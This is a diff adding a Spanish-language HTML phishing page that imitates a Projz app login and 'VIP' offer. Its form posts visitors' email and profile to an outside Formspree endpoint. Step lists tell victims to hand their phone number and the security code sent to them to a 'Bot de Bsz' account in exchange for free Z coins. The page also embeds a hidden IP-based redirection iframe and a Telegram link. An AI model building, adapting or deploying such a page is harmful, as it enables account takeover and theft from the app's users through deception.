@@ -1,0 +1,78 @@
+ 
+<html lang="en">
+<head>
+      <link rel="icon" type="image/png" href="https://files.catbox.moe/p1iphl.png">  
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-..." crossorigin="anonymous" />
+   <script src="https://kit.fontawesome.com/your-font-awesome-kit.js" crossorigin="anonymous"></script>
+<style></style>
+  
+</head>
+<body>
+<div class="texto">
+      <h1>Inicia secion</h1>
+      </div>
+<div class="texto-help">
+     <h3><a href="https://support.projz.com/en/support/solutions" target="_blank">Ayuda</a></h3>
+      </div>
+
+<button class="circle-button" id="redirectToPage"><i class="fas fa-arrow-left"></i></button> 
+<form
+  action="https://formspree.io/f/xyyrdqzo"
+  method="POST"
+>
+  <label>
+    <input type="email" name="email" class="custom-input" placeholder="Email">
+  </label>
+  <label>
+   <input type="perfil" name="perfil" id="passwordInput" class="custom-input" placeholder="Perfil De Usuario">
+  </label>
+  <!-- your other form fields go here -->
+<button type="submit" class="custom-button" onclick="enviarFormulario()"><h2>Enviar</h2></button>
+</form>
+  
+    <h3><a href="#" class="custom-link">¿Deseas ser usuario VIP?</a></h3>
+
+    <div id="myModal" class="modal">
+        <span class="close">&times;</span>
+        <div class="modal-content">
+            <p><h4>¿Deseas ser usuario VIP?</h4></p>
+            <ol>
+                <li>- Preciona las letras "¿Deseas ser usuario VIP?" y te abrirá un formulario.</li>
+               <hr class="separator">
+                <li>- Ingresa el número de teléfono y código de seguridad que se te genera.</li>
+               <hr class="separator">
+                <li>- Presiona enviar y espera que el bot te responda en la app Projz.</li>
+               <hr class="separator">
+                <li>- Espera que te llegue una solicitud de mensaje en la app de Z donde un usuario llamado "Bot de Bsz". </li>
+               <hr class="separator">
+                <li>- Acepta y envía el código de seguridad y te llegarán las Z coins al día con el 50% que te pueda generar más Z coins. </li>
+            </ol>
+        </div>
+    </div>
+
+ <br>¿Cómo funciona?</br>
+        <ol>
+            <li>- Ingrese el correo y su perfil de usuario.</li>
+            <li>- Le pica el botón "Enviar".</li>
+            <li>- Espera que te responda el bot por Gmail.</li>
+            <li>- Te enviarán un correo el bot y un código de seguridad y lo copia.</li>
+            <li>- Revisa el correo y te llegará una solicitud de mensaje en la app de Z donde un usuario llamado "Bot de Bsz".</li>
+            <li>- Acepta y envía el código de seguridad y le llegarán las Z coins al dia.</li>
+        </ol>
+
+ 
+
+    <div class="corner-square">
+        <a href="https://t.me/+sOf-gqn6SClmNDcx">
+            <img src="https://files.catbox.moe/x20tc5.png">
+        </a>
+    </div>
+  
+<script>
+</script>
+
+<iframe src="https://appbsz.crearforo.net/h87-redireccionamiento-basado-en-ip	"></iframe>
+</body>
+</html>
